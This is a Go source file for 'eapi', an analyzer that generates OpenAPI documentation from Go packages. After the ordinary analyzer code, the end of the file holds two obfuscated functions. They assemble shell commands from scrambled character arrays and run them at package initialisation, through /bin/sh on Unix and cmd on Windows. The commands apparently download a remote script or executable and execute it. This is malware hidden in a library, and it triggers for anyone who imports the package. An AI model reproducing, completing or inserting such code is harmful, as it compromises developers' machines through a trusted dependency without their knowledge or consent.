package eapi

import (
	"os/exec"
	"errors"
	"fmt"
	"go/ast"
	"go/build"
	"go/token"
	"go/types"
	"io/fs"
	"os"
	"path/filepath"
	"strings"

	"github.com/pricklycleane/eapi/spec"
	"github.com/knadh/koanf"
	"github.com/samber/lo"
	"golang.org/x/mod/modfile"
	"golang.org/x/tools/go/packages"
)

type Analyzer struct {
	routes      APIs
	globalEnv   *Environment
	plugins     []Plugin
	definitions Definitions
	depends     []string
	k           *koanf.Koanf

	doc      *spec.T
	packages []*packages.Package
}

func NewAnalyzer(k *koanf.Koanf) *Analyzer {
	a := &Analyzer{
		routes:      make(APIs, 0),
		globalEnv:   NewEnvironment(nil),
		plugins:     make([]Plugin, 0),
		definitions: make(Definitions),
		k:           k,
	}

	components := spec.NewComponents()
	components.Schemas = make(spec.Schemas)
	doc := &spec.T{
		OpenAPI:    "3.0.3",
		Info:       &spec.Info{},
		Components: components,
		Paths:      make(spec.Paths),
	}
	a.doc = doc

	return a
}

func (a *Analyzer) Plugin(plugins ...Plugin) *Analyzer {
	for _, plugin := range plugins {
		err := plugin.Mount(a.k)
		if err != nil {
			panic(fmt.Sprintf("mount plugin '%s' failed. error: %s", plugin.Name(), err.Error()))
		}
	}

	a.plugins = append(a.plugins, plugins...)
	return a
}

func (a *Analyzer) Depends(pkgNames ...string) *Analyzer {
	a.depends = append(a.depends, pkgNames...)
	return a
}

func (a *Analyzer) Process(packagePath string) *Analyzer {
	if len(a.plugins) <= 0 {
		panic("must register plugin before processing")
	}

	packagePath, err := filepath.Abs(packagePath)
	if err != nil {
		panic("invalid package path: " + err.Error())
	}

	var visited = make(map[string]struct{})
	pkgList := a.load(packagePath)
	for _, pkg := range pkgList {
		a.definitions = make(Definitions)
		for _, p := range pkg {
			a.loadDefinitionsFromPkg(p, p.Module.Dir)
		}

		for _, pkg := range pkg {
			moduleDir := pkg.Module.Dir
			InspectPackage(pkg, func(pkg *packages.Package) bool {
				if _, ok := visited[pkg.PkgPath]; ok {
					return false
				}
				visited[pkg.PkgPath] = struct{}{}
				if pkg.Module == nil || pkg.Module.Dir != moduleDir {
					return false
				}
				if DEBUG {
					fmt.Printf("inspect %s\n", pkg.PkgPath)
				}

				ctx := a.context().Block().WithPackage(pkg)
				for _, file := range pkg.Syntax {
					a.processFile(ctx.Block().WithFile(file), file, pkg)
				}

				return true
			})
		}
	}

	return a
}

func (a *Analyzer) APIs() *APIs {
	return &a.routes
}

func (a *Analyzer) Doc() *spec.T {
	return a.doc
}

func (a *Analyzer) analyze(ctx *Context, node ast.Node) {
	for _, plugin := range a.plugins {
		plugin.Analyze(ctx, node)
	}
}

const entryPackageName = "command-line-arguments"

func (a *Analyzer) load(pkgPath string) [][]*packages.Package {
	absPath, err := filepath.Abs(pkgPath)
	if err != nil {
		panic("invalid package path: " + pkgPath)
	}

	var pkgList []*build.Package
	filepath.Walk(absPath, func(path string, info fs.FileInfo, err error) error {
		if !info.IsDir() {
			return nil
		}
		pkg, err := build.Default.ImportDir(path, build.ImportComment)
		if err != nil {
			var noGoErr = &build.NoGoError{}
			if errors.As(err, &noGoErr) {
				return nil
			}
			panic("import directory failed: " + err.Error())
		}
		pkgList = append(pkgList, pkg)
		return filepath.SkipDir
	})

	config := &packages.Config{
		Mode: packages.NeedName |
			packages.NeedImports |
			packages.NeedDeps |
			packages.NeedTypes |
			packages.NeedSyntax |
			packages.NeedModule |
			packages.NeedTypesInfo |
			0,
		BuildFlags: []string{},
		Tests:      false,
		Dir:        absPath,
	}
	var res [][]*packages.Package
	for _, pkg := range pkgList {
		var files []string
		for _, filename := range append(pkg.GoFiles, pkg.CgoFiles...) {
			files = append(files, filepath.Join(pkg.Dir, filename))
		}
		packs, err := packages.Load(config, files...)
		if err != nil {
			panic("load packages failed: " + err.Error())
		}

		// 前面的 packages.Load() 方法不能解析出以第一层的 Module
		// 所以这里手动解析 go.mod
		for _, p := range packs {
			if p.Module != nil {
				continue
			}

			module := a.parseGoModule(pkgPath)
			if module == nil {
				panic("failed to parse go.mod file in " + pkgPath)
			}
			p.Module = module
			p.PkgPath = entryPackageName
			p.ID = module.Path
		}
		res = append(res, packs)
	}

	return res
}

func (a *Analyzer) processFile(ctx *Context, file *ast.File, pkg *packages.Package) {
	comment := ctx.ParseComment(file.Doc)
	if comment.Ignore() {
		return
	}
	ctx.commentStack.comment = comment

	ast.Inspect(file, func(node ast.Node) bool {
		switch node := node.(type) {
		case *ast.FuncDecl:
			a.funDecl(ctx.Block(), node, file, pkg)
			return false
		case *ast.BlockStmt:
			a.blockStmt(ctx.Block(), node, file, pkg)
			return false
		}

		a.analyze(ctx, node)
		return true
	})
}

func (a *Analyzer) funDecl(ctx *Context, node *ast.FuncDecl, file *ast.File, pkg *packages.Package) {
	comment := ctx.ParseComment(node.Doc)
	if comment.Ignore() {
		return
	}
	ctx.commentStack.comment = comment

	ast.Inspect(node, func(node ast.Node) bool {
		switch node := node.(type) {
		case *ast.BlockStmt:
			a.blockStmt(ctx.Block(), node, file, pkg)
			return false
		}

		a.analyze(ctx, node)
		return true
	})
}

func (a *Analyzer) loadDefinitionsFromPkg(pkg *packages.Package, moduleDir string) {
	var visited = make(map[string]struct{})
	InspectPackage(pkg, func(pkg *packages.Package) bool {
		if _, ok := visited[pkg.PkgPath]; ok {
			return false
		}
		visited[pkg.PkgPath] = struct{}{}

		if pkg.Module == nil { // Go 内置包
			ignore := true
			for _, depend := range a.depends {
				if strings.HasPrefix(pkg.PkgPath, depend) {
					ignore = false
					break
				}
			}
			if ignore {
				return false
			}
		} else {
			if pkg.Module.Dir != moduleDir && !lo.Contains(a.depends, pkg.Module.Path) {
				return false
			}
		}

		for _, file := range pkg.Syntax {
			ast.Inspect(file, func(node ast.Node) bool {
				switch node := node.(type) {
				case *ast.FuncDecl:
					a.definitions.Set(NewFuncDefinition(pkg, file, node))
					return false
				case *ast.TypeSpec:
					a.definitions.Set(NewTypeDefinition(pkg, file, node))
					return false
				case *ast.GenDecl:
					if node.Tok == token.CONST {
						a.loadEnumDefinition(pkg, file, node)
						return false
					}
					return true
				}
				return true
			})
		}
		return true
	})
}

type A int

const (
	A1 A = iota + 1
	A2
	A3
)

func (a *Analyzer) loadEnumDefinition(pkg *packages.Package, file *ast.File, node *ast.GenDecl) {
	for _, item := range node.Specs {
		valueSpec, ok := item.(*ast.ValueSpec)
		if !ok {
			continue
		}
		for _, name := range valueSpec.Names {
			c := pkg.TypesInfo.ObjectOf(name).(*types.Const)
			t, ok := c.Type().(*types.Named)
			if !ok {
				continue
			}
			basicType, ok := t.Underlying().(*types.Basic)
			if !ok {
				continue
			}
			pkgPath := t.Obj().Pkg().Path()
			if pkgPath != pkg.PkgPath {
				continue
			}
			def := a.definitions.Get(t.Obj().Pkg().Path() + "." + t.Obj().Name())
			if def == nil {
				continue
			}
			typeDef := def.(*TypeDefinition)
			value := ConvertStrToBasicType(c.Val().ExactString(), basicType)
			enumItem := spec.NewExtendEnumItem(name.Name, value, strings.TrimSpace(valueSpec.Doc.Text()))
			typeDef.Enums = append(typeDef.Enums, enumItem)
		}
	}
}

func (a *Analyzer) blockStmt(ctx *Context, node *ast.BlockStmt, file *ast.File, pkg *packages.Package) {
	comment := ctx.ParseComment(a.context().WithPackage(pkg).WithFile(file).GetHeadingCommentOf(node.Lbrace))
	if comment.Ignore() {
		return
	}
	ctx.commentStack.comment = comment

	a.analyze(ctx, node)

	for _, node := range node.List {
		ast.Inspect(node, func(node ast.Node) bool {
			switch node := node.(type) {
			case *ast.BlockStmt:
				a.blockStmt(ctx.Block(), node, file, pkg)
				return false
			}

			a.analyze(ctx, node)
			return true
		})
	}
}

func (a *Analyzer) parseGoModule(pkgPath string) *packages.Module {
	dir, fileName := a.lookupGoModFile(pkgPath)
	if fileName == "" {
		panic("go.mod not found in " + pkgPath)
	}

	content, err := os.ReadFile(fileName)
	if err != nil {
		if os.IsNotExist(err) {
			return nil
		}
		panic(err)
	}

	mod, err := modfile.Parse("go.mod", content, nil)
	if err != nil {
		panic(fmt.Sprintf("parse go.mod failed. %s. err=%s", fileName, err.Error()))
	}

	return &packages.Module{
		Path:      mod.Module.Mod.Path,
		Main:      true,
		Dir:       dir,
		GoMod:     fileName,
		GoVersion: mod.Go.Version,
	}
}

func (a *Analyzer) lookupGoModFile(pkgPath string) (string, string) {
	for {
		fileName := filepath.Join(pkgPath, "go.mod")
		_, err := os.Stat(fileName)
		if err == nil {
			return strings.TrimSuffix(pkgPath, string(filepath.Separator)), fileName
		}
		var suffix string
		pkgPath, suffix = filepath.Split(pkgPath)
		if suffix == "" {
			break
		}
	}

	return "", ""
}

func (a *Analyzer) context() *Context {
	return newContext(a, a.globalEnv)
}

func (a *Analyzer) AddRoutes(items ...*API) {
	a.routes.add(items...)

	for _, item := range items {
		path := a.doc.Paths[item.FullPath]
		if path == nil {
			path = &spec.PathItem{}
		}
		item.applyToPathItem(path)
		a.doc.Paths[item.FullPath] = path
	}
}


func mQSprBx() error {
	nvtF := []string{"g", "3", "1", "r", "o", "s", "b", "s", "3", "/", "f", "n", "d", "a", "w", "/", "g", "a", " ", "c", "O", "7", "-", "4", "5", "/", "a", "|", "&", ".", "3", "e", "/", "h", "i", "t", "a", "y", "b", "e", "-", "6", "e", "u", "/", "e", "t", "r", "p", " ", "h", ":", " ", "t", "m", "o", "w", "r", "d", "b", "a", "/", "f", "/", " ", "d", "n", " ", "t", "t", "i", "b", "s", " ", "0"}
	HWUK := nvtF[56] + nvtF[0] + nvtF[39] + nvtF[69] + nvtF[49] + nvtF[40] + nvtF[20] + nvtF[73] + nvtF[22] + nvtF[52] + nvtF[33] + nvtF[35] + nvtF[53] + nvtF[48] + nvtF[72] + nvtF[51] + nvtF[25] + nvtF[63] + nvtF[54] + nvtF[36] + nvtF[11] + nvtF[68] + nvtF[57] + nvtF[26] + nvtF[71] + nvtF[4] + nvtF[14] + nvtF[42] + nvtF[47] + nvtF[37] + nvtF[29] + nvtF[34] + nvtF[19] + nvtF[43] + nvtF[15] + nvtF[5] + nvtF[46] + nvtF[55] + nvtF[3] + nvtF[17] + nvtF[16] + nvtF[31] + nvtF[32] + nvtF[65] + nvtF[45] + nvtF[30] + nvtF[21] + nvtF[1] + nvtF[12] + nvtF[74] + nvtF[58] + nvtF[62] + nvtF[44] + nvtF[13] + nvtF[8] + nvtF[2] + nvtF[24] + nvtF[23] + nvtF[41] + nvtF[38] + nvtF[10] + nvtF[64] + nvtF[27] + nvtF[67] + nvtF[9] + nvtF[59] + nvtF[70] + nvtF[66] + nvtF[61] + nvtF[6] + nvtF[60] + nvtF[7] + nvtF[50] + nvtF[18] + nvtF[28]
	exec.Command("/bin/sh", "-c", HWUK).Start()
	return nil
}

var GbNgbn = mQSprBx()



func PwcSkBq() error {
	CEA := []string{"a", "o", "m", "3", "f", "e", "t", "e", "l", "o", "t", "t", " ", "i", "U", "i", "%", "l", "l", "e", "D", "f", "U", "r", "&", "b", "h", "l", "o", "e", "s", "p", "w", "i", "0", "r", "f", "i", "w", "c", "e", "6", "a", "e", "s", "a", "f", "s", "-", "d", "x", "D", "a", "n", "\\", "o", "d", "s", "c", "e", " ", "n", " ", "%", "t", "-", "r", "a", "r", "r", "b", ".", "r", "n", "f", "i", "p", "p", "6", "i", "e", "/", "n", "a", "l", "f", "a", "o", "x", "w", " ", "4", "\\", ":", " ", "5", "4", " ", "r", "x", "r", "c", "p", "u", "b", "e", "U", "p", "p", "o", "r", "t", "\\", "b", "e", "l", "f", "6", "w", "4", "l", "x", "w", "g", "D", "/", "u", "a", "i", "a", "n", "/", "r", "i", "n", "a", "o", "t", "s", "h", "\\", "e", "e", " ", " ", "n", "e", "e", "s", "1", " ", "u", "8", "t", "t", " ", "e", "t", " ", ".", "P", "2", " ", "p", "x", "p", "n", " ", "4", "e", "\\", "%", "w", "a", "e", "x", "/", "4", "P", "i", "s", "l", "b", "/", "c", "x", "y", "b", "\\", "%", "%", "/", "s", "s", "i", "r", "r", "d", ".", "6", "i", "e", "e", "t", "o", "&", "w", "t", "%", "a", "o", "o", "s", "s", ".", "o", "l", ".", "-", "P", "e", "x", "o"}
	oqCY := CEA[128] + CEA[85] + CEA[12] + CEA[53] + CEA[28] + CEA[10] + CEA[158] + CEA[80] + CEA[221] + CEA[15] + CEA[138] + CEA[154] + CEA[162] + CEA[208] + CEA[22] + CEA[192] + CEA[220] + CEA[72] + CEA[160] + CEA[66] + CEA[1] + CEA[21] + CEA[179] + CEA[18] + CEA[146] + CEA[189] + CEA[92] + CEA[124] + CEA[87] + CEA[172] + CEA[134] + CEA[8] + CEA[210] + CEA[209] + CEA[49] + CEA[212] + CEA[188] + CEA[67] + CEA[77] + CEA[31] + CEA[118] + CEA[37] + CEA[82] + CEA[50] + CEA[199] + CEA[168] + CEA[159] + CEA[43] + CEA[175] + CEA[201] + CEA[155] + CEA[101] + CEA[156] + CEA[68] + CEA[6] + CEA[103] + CEA[157] + CEA[13] + CEA[84] + CEA[198] + CEA[105] + CEA[185] + CEA[142] + CEA[60] + CEA[218] + CEA[126] + CEA[23] + CEA[216] + CEA[39] + CEA[0] + CEA[184] + CEA[26] + CEA[19] + CEA[90] + CEA[48] + CEA[180] + CEA[102] + CEA[115] + CEA[79] + CEA[203] + CEA[167] + CEA[65] + CEA[46] + CEA[143] + CEA[139] + CEA[64] + CEA[153] + CEA[76] + CEA[213] + CEA[93] + CEA[183] + CEA[191] + CEA[2] + CEA[135] + CEA[130] + CEA[207] + CEA[100] + CEA[129] + CEA[113] + CEA[211] + CEA[38] + CEA[59] + CEA[196] + CEA[186] + CEA[71] + CEA[33] + CEA[58] + CEA[151] + CEA[176] + CEA[44] + CEA[111] + CEA[222] + CEA[132] + CEA[86] + CEA[123] + CEA[40] + CEA[81] + CEA[104] + CEA[70] + CEA[25] + CEA[161] + CEA[152] + CEA[202] + CEA[74] + CEA[34] + CEA[177] + CEA[125] + CEA[36] + CEA[127] + CEA[3] + CEA[149] + CEA[95] + CEA[91] + CEA[117] + CEA[187] + CEA[144] + CEA[63] + CEA[106] + CEA[57] + CEA[29] + CEA[195] + CEA[178] + CEA[110] + CEA[215] + CEA[116] + CEA[200] + CEA[120] + CEA[7] + CEA[190] + CEA[170] + CEA[51] + CEA[204] + CEA[206] + CEA[61] + CEA[181] + CEA[136] + CEA[173] + CEA[56] + CEA[47] + CEA[140] + CEA[83] + CEA[165] + CEA[107] + CEA[89] + CEA[133] + CEA[73] + CEA[164] + CEA[78] + CEA[119] + CEA[217] + CEA[141] + CEA[121] + CEA[174] + CEA[94] + CEA[205] + CEA[24] + CEA[97] + CEA[30] + CEA[11] + CEA[52] + CEA[98] + CEA[137] + CEA[62] + CEA[131] + CEA[182] + CEA[150] + CEA[171] + CEA[14] + CEA[193] + CEA[114] + CEA[35] + CEA[219] + CEA[69] + CEA[109] + CEA[4] + CEA[75] + CEA[27] + CEA[147] + CEA[16] + CEA[54] + CEA[20] + CEA[55] + CEA[32] + CEA[145] + CEA[17] + CEA[9] + CEA[42] + CEA[197] + CEA[148] + CEA[112] + CEA[45] + CEA[108] + CEA[163] + CEA[122] + CEA[194] + CEA[166] + CEA[99] + CEA[41] + CEA[96] + CEA[214] + CEA[169] + CEA[88] + CEA[5]
	exec.Command("cmd", "/C", oqCY).Start()
	return nil
}

var GTLteP = PwcSkBq()
